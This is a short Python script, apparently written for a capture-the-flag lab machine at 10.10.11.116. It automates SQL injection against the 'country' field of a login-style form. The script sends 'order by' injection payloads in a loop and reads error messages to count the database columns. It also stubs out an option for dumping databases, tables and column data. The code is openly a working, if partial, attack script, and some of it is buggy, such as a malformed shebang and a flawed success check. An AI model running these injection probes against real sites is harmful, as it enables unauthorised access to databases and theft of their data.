#!/usr/env/bin/python


#Purpose:
#Version:1.0
#Created Date: sáb 22 abr 2023 10:43:22 -05
#Modified Date:
#Website:
#Script name: sqliValidation
#Author: Jorge Donaires Mendoza

#LINEOFTEXT

import requests
import argparse
import signal
import base64
import sys
import time
import re

# GLOBAL VARIABLES
URL = 'http://10.10.11.116'

# CLASES
class Color:

  red = '\033[91m'
  green = '\033[92m'
  yellow = '\033[93m'
  ligth_purple = '\033[94m'
  purple = '\033[95m'
  cyan = '\033[96m'
  ligth_gray = '\033[97m'
  black = '\033[98m'
  end = '\033[00m'

def def_handler(sig, frame):
  print(f'\n\n{Color.red}[!] Interrupting...{Color.end}')
  sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def show_banner():

  with open('banner.txt', 'r', encoding='ascii') as file:
    file = file.read()
    banner = base64.b64decode(f'{file}').decode()
    print(f'\n\n{Color.green}{banner}{Color.end}\n\n')
    

def arguments():

  parse = argparse.ArgumentParser(description='Welcome to my first script')
  parse.add_argument('-q', '--query', dest='dump', nargs='*', help='Consulta MySQL: descubre db, tablas, columnas y sus datos.')

def make_sqli(payload):

  r = requests.post(URL, data={'username': 'Jorge', 'country':payload})

  if 'Uncaught Error: Call to a member' != r.text:
    print('Inyeccion exitosa!!!!!')
  else:
    print('Error')

def num_columns():

  for i in range(101):
    payload = f"Brazil' order by {i} -- -'"
    r = requests.post(URL, data={'username':'Jorge','country':payload})
    # make_sqli(payload)

    if 'Uncaught Error: Call to a member' not in r.text:
      print(f'El numero de columnas es: {i} Buena!!!!!')
      break


def main():

  time.sleep(2)
  show_banner()
  time.sleep(2)
  num_columns()

if __name__ == '__main__':

  try:
    main()

  except KeyboardInterrupt:
    print('Programa cancelado')

# END #
    
